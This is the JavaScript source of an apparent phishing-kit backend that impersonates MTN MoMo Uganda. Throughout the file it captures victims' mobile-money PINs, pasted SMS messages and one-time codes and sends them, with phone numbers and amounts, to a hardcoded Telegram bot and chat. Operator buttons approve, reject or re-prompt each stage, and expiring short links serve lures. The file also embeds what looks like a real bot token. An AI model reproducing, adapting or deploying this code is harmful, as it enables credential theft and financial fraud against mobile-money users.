/**
 * MTN MoMo Uganda — Backend
 * 3-stage flow: pin → sms → otp
 * Inline Telegram buttons per stage
 * Short links (/api/links) with 30-minute expiry
 * Session persistence with disk-reload fallback
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8936298383:AAGUnZanytc5tEUE5ruyMjOzxR6-6hPjbR0';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SESSION_TTL_MS     = 60 * 60 * 1000;
const LINK_TTL_MS        = 30 * 60 * 1000;   // 30 minutes

// Use persistent disk if available, else fallback to /tmp
const DATA_DIR      = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
const SESSIONS_FILE = path.join(DATA_DIR, 'momo_sessions.json');
const LINKS_FILE    = path.join(DATA_DIR, 'momo_links.json');

try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}

app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ============================================================
   SESSION STORE
   ============================================================ */
let sessions = new Map();

function loadSessionsFromDisk(){
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return new Map(parsed);
      }
    }
  } catch(e){ console.warn('[sessions] load failed:', e.message); }
  return null;
}

// Initial load
{
  const restored = loadSessionsFromDisk();
  if (restored) {
    sessions = restored;
    console.log(`[sessions] restored ${sessions.size} from disk`);
  }
}

function persistSessions(){
  try { 
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([...sessions.entries()])); 
  } catch(e){ 
    console.warn('[sessions] persist failed:', e.message); 
  }
}

function createSession(stage, meta){
  const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
  const now = Date.now();
  const session = {
    id, stage, meta,
    status: 'pending',
    createdAt: now,
    expiresAt: now + SESSION_TTL_MS
  };
  sessions.set(id, session);
  persistSessions(); // Save immediately
  console.log(`[session] created ${id} stage=${stage} total=${sessions.size}`);
  return session;
}

function getSession(id){
  let s = sessions.get(id);

  // If not in memory, reload from disk (handles server restart)
  if (!s) {
    const restored = loadSessionsFromDisk();
    if (restored) {
      sessions = restored;
      s = sessions.get(id);
      if (s) console.log(`[session] recovered ${id} from disk`);
    }
  }

  if (!s) { console.log(`[session] MISS ${id}`); return null; }
  if (Date.now() > s.expiresAt && s.status === 'pending') s.status = 'expired';
  console.log(`[session] HIT ${id} status=${s.status}`);
  return s;
}

// Cleanup old sessions every 5 min
setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, s] of sessions) {
    if (now > s.expiresAt + 60000) { sessions.delete(id); changed = true; }
  }
  if (changed) persistSessions();
}, 5 * 60 * 1000);

/* ============================================================
   SHORT-LINK STORE
   ============================================================ */
let links = new Map();

function loadLinksFromDisk(){
  try {
    if (fs.existsSync(LINKS_FILE)) {
      const raw = fs.readFileSync(LINKS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return new Map(parsed);
      }
    }
  } catch(e){ console.warn('[links] load failed:', e.message); }
  return null;
}

{
  const restored = loadLinksFromDisk();
  if (restored) {
    links = restored;
    console.log(`[links] restored ${links.size} from disk`);
  }
}

function persistLinks(){
  try { 
    fs.writeFileSync(LINKS_FILE, JSON.stringify([...links.entries()])); 
  } catch(e){ 
    console.warn('[links] persist failed:', e.message); 
  }
}

/* ============================================================
   HELPERS
   ============================================================ */
function esc(s = ''){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tgSend(text, replyMarkup){
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(body)
  });
  return r.json();
}

async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
  }).catch(()=>{});
}

async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

/* ============================================================
   HEALTH & DEBUG
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'momo-uganda-backend',
    activeSessions: sessions.size,
    activeLinks: links.size,
    linkTTLMinutes: LINK_TTL_MS / 60000,
    dataDir: DATA_DIR,
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: process.env.PUBLIC_URL || '(not set)',
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({
  ok: true,
  ts: Date.now(),
  activeSessions: sessions.size,
  activeLinks: links.size
}));

app.get('/api/debug', (_req, res) => {
  const list = [];
  for (const [id, s] of sessions.entries()) {
    list.push({ id, stage: s.stage, status: s.status, ageSec: Math.floor((Date.now() - s.createdAt) / 1000) });
  }
  res.json({ ok: true, count: list.length, sessions: list });
});

/* ============================================================
   WEBHOOK DIAGNOSTIC
   ============================================================ */
app.get('/api/check-webhook', async (_req, res) => {
  try {
    const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
    const d = await r.json();
    res.json(d);
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.get('/api/set-webhook', async (_req, res) => {
  try {
    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}`).replace(/\/+$/, '');
    const webhookUrl = `${publicUrl}/api/telegram-webhook`;
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    const d = await r.json();
    res.json({ webhookUrl, result: d });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

/* ============================================================
   SHORT LINKS — with 30-minute expiry
   ============================================================ */
app.post('/api/links', (req, res) => {
  try {
    const body = req.body || {};
    const tracking = String(body.trackingNumber || body.t || '').trim().toUpperCase();
    if (!tracking) {
      return res.status(400).json({ ok: false, error: 'Tracking number required' });
    }
    const now = Date.now();
    const record = {
      trackingNumber: tracking,
      accountName: body.accountName || '',
      accountNumber: body.accountNumber || '',
      amount: body.amount || '0',
      currency: (body.currency || 'UGX').toUpperCase(),
      countryCode: body.countryCode || '+256',
      countryFlag: body.countryFlag || '🇺🇬',
      countryName: body.countryName || 'Uganda',
      modeOfPayment: body.modeOfPayment || '',
      receiptOptional: body.receiptOptional || '',
      timestamp: body.timestamp || '',
      createdAt: now,
      expiresAt: now + LINK_TTL_MS
    };
    links.set(tracking, record);
    persistLinks();
    console.log(`[link] created ${tracking} expires in ${LINK_TTL_MS/60000}min (total=${links.size})`);
    return res.json({ ok: true, code: tracking, expiresAt: record.expiresAt, shortUrl: `index.html?t=${tracking}` });
  } catch (err) {
    console.error('create link error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.get('/api/links/:code', (req, res) => {
  const code = String(req.params.code || '').trim().toUpperCase();
  let rec = links.get(code);

  // Try disk reload on miss (in case server restarted)
  if (!rec) {
    const restored = loadLinksFromDisk();
    if (restored) {
      links = restored;
      rec = links.get(code);
    }
  }

  if (!rec) {
    return res.status(404).json({ ok: false, error: 'Link not found' });
  }
  // 30-minute expiry check
  if (rec.expiresAt && Date.now() > rec.expiresAt) {
    links.delete(code);
    persistLinks();
    console.log(`[link] expired ${code}`);
    return res.status(410).json({ ok: false, error: 'Link expired' });
  }
  return res.json({ ok: true, ...rec });
});

/* ============================================================
   NOTIFY — 3 stages: 'pin' | 'sms' | 'otp'
   ============================================================ */
app.post('/api/notify', async (req, res) => {
  try {
    const { stage, phone, pinOrOtp, otp, sms, receipt } = req.body || {};
    if (!stage || !['pin','sms','otp'].includes(stage)) {
      return res.status(400).json({ ok: false, error: 'Invalid stage' });
    }

    const s = createSession(stage, { phone, receipt });

    let label, keyLabel, secretValue, formattedSecret, buttons;

    if (stage === 'pin') {
      label = '🔐 <b>PIN Captured</b>';
      keyLabel = 'PIN';
      secretValue = pinOrOtp || '—';
      formattedSecret = `<code>${esc(secretValue)}</code>`;
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${s.id}` },
          { text: '❌ Reject',  callback_data: `reject:${s.id}` }
        ]]
      };
    } else if (stage === 'sms') {
      label = '📩 <b>SMS Pasted</b>';
      keyLabel = 'SMS';
      secretValue = sms || '—';
      formattedSecret = `<pre><code>${esc(secretValue)}</code></pre>`;
      buttons = {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `approve:${s.id}` },
            { text: '❌ Reject',  callback_data: `reject:${s.id}` }
          ],
          [
            { text: '🔁 Resend',  callback_data: `resend:${s.id}` }
          ]
        ]
      };
    } else {
      label = '🔢 <b>OTP Captured</b>';
      keyLabel = 'OTP';
      secretValue = otp || pinOrOtp || '—';
      formattedSecret = `<code>${esc(secretValue)}</code>`;
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${s.id}` },
          { text: '🔁 Resend',  callback_data: `resend:${s.id}` }
        ]]
      };
    }

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(receipt?.trackingNumber || '—')}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(receipt?.accountName || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || receipt?.accountNumber || '—')}</code>\n` +
      `🔑 <b>${keyLabel}:</b> ${formattedSecret}\n` +
      `💳 <b>Service:</b> ${esc(receipt?.modeOfPayment || '—')}\n` +
      `💰 <b>Amount:</b> ${esc(receipt?.currency || '')} ${esc(receipt?.amount || '—')}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Kampala' })} EAT\n` +
      `\n<i>Session: ${esc(s.id)}</i>`;

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok: false, error: tg.description });
    }

    return res.json({ ok: true, sessionId: s.id });
  } catch (err) {
    console.error('notify error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

/* ============================================================
   STATUS — poll from client
   ============================================================ */
app.get('/api/status/:id', (req, res) => {
  const s = getSession(req.params.id);
  if (!s) return res.status(404).json({ ok: false, error: 'Session not found' });
  return res.json({ ok: true, status: s.status, stage: s.stage });
});

/* ============================================================
   TELEGRAM WEBHOOK
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] received. hasCallback=${!!cq} data=${cq?.data || 'none'}`);

    if (cq && cq.data) {
      const [action, sessionId] = cq.data.split(':');
      const s = getSession(sessionId);

      if (!s) {
        // Try one more reload before giving up
        const restored = loadSessionsFromDisk();
        if (restored) {
          sessions = restored;
          const retry = sessions.get(sessionId);
          if (retry) {
            console.log(`[webhook] recovered ${sessionId} from disk on retry`);
            await applyAction(retry, action, cq);
            return res.json({ ok: true });
          }
        }
        await tgAnswer(cq.id, 'Session expired');
        return res.json({ ok: true });
      }
      if (s.status !== 'pending') {
        await tgAnswer(cq.id, `Already ${s.status}`);
        return res.json({ ok: true });
      }

      await applyAction(s, action, cq);
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

async function applyAction(s, action, cq){
  if (action === 'approve') { s.status = 'approved'; await tgAnswer(cq.id, '✅ Approved'); }
  else if (action === 'reject')  { s.status = 'rejected'; await tgAnswer(cq.id, '❌ Rejected'); }
  else if (action === 'resend')  { s.status = 'resend';   await tgAnswer(cq.id, '🔁 Resend'); }
  else { await tgAnswer(cq.id, 'Unknown action'); }

  persistSessions(); // Save immediately after status change

  if (cq.message) {
    await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
  }

  console.log(`[webhook] processed action=${action} sid=${s.id} status=${s.status}`);
}

/* ============================================================
   AUTO-REGISTER WEBHOOK — with allowed_updates
   ============================================================ */
async function registerWebhook(){
  const publicUrl = (
    process.env.PUBLIC_URL ||
    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
    `http://localhost:${PORT}`
  ).replace(/\/+$/, '');
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  console.log(`Registering webhook: ${webhookUrl}`);
  try {
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(
      `${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`
    );
    const d = await r.json();
    console.log('setWebhook result:', d);
  } catch (e) {
    console.error('setWebhook failed:', e.message);
  }
}

app.listen(PORT, async () => {
  console.log(`MTN MoMo Uganda backend running on port ${PORT}`);
  console.log(`Data directory: ${DATA_DIR}`);
  await registerWebhook();
});
